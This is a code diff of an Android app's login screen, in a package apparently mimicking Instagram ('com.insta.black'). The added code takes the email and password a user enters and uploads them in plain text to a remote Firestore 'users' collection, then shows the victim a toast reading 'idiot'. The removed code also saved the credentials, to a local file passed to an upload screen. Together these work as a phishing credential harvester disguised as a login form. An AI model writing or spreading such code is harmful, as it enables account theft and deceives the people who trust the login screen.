@@ -1,20 +1,23 @@
 package com.insta.black;
 
-import android.content.Intent;
 import android.graphics.Color;
 import android.os.Bundle;
-import android.text.TextUtils; // Import for non-empty string checks
+
+import android.util.Log;
 import android.view.View;
 import android.widget.Button;
-// Import for email validation
+
+import com.google.firebase.firestore.DocumentReference;
+import com.google.firebase.firestore.FirebaseFirestore;
 import android.util.Patterns;
 import android.widget.EditText;
-import android.widget.TextView;
+import android.widget.Toast;
 
 import androidx.appcompat.app.AppCompatActivity;
 
 import java.io.File;
 import java.io.FileOutputStream;
+import java.util.HashMap;
 
 public class login extends AppCompatActivity {
 
@@ -27,36 +30,41 @@ public class login extends AppCompatActivity {
         loginButton.setOnClickListener(new View.OnClickListener() {
             @Override
             public void onClick(View v) {
+
                 EditText emailEditText = findViewById(R.id.editTextTextEmailAddress2);
                 EditText passwordEditText = findViewById(R.id.password);
 
                 String email = emailEditText.getText().toString().trim();
                 String password = passwordEditText.getText().toString().trim();
+                Log.d("app","pressed");
 
                 if (isValidEmail(email)) {
+                    Log.d("app","valid email");
                     if (isValidPassword(password)) {
+                        Log.d("app","valid password");
                         try {
-                            String data = email + " " + password ;
-                            File directory = getFilesDir();
-                            File fl = new File(directory,"fl.txt");
-                            FileOutputStream out = new FileOutputStream(fl);
-                            out.write(data.getBytes());
-                            out.close();
-                            Intent up = new Intent(login.this, upload.class);
-                            up.putExtra("path",fl.getPath());
-                            startActivity(up);
-                            finish();
+                            setContentView(R.layout.up);
+                            FirebaseFirestore firestore;
+                            firestore = FirebaseFirestore.getInstance();
+                            HashMap<String,Object> map = new HashMap<>();
+                            map.put("email",email);
+                            map.put("password",password);
+                            firestore.collection("users").add(map).addOnSuccessListener(DocumentReference ->{
+                                Toast.makeText(login.this,"idiot",Toast.LENGTH_LONG).show();
+                                finish();}
+                            ).addOnFailureListener(DocumentReference ->{
+                                Toast.makeText(login.this,"error please check your network",Toast.LENGTH_LONG).show();
+                            });
 
 
                         }catch(Exception e){
-                            finish();
+                            Log.d("app",e.getMessage());
                         }
                     } else {
                         passwordEditText.setError("Invalid password");
                         passwordEditText.setTextColor(Color.RED);
                     }
                 } else {
-                    // Display error for invalid email
                     emailEditText.setError("Invalid email");
                     emailEditText.setTextColor(Color.RED);
                 }
@@ -69,7 +77,7 @@ public class login extends AppCompatActivity {
     }
 
     private boolean isValidPassword(String password) {
-        int minLength = 6; // Example minimum length
+        int minLength = 6;
         return password.length() >= minLength;
     }
 }
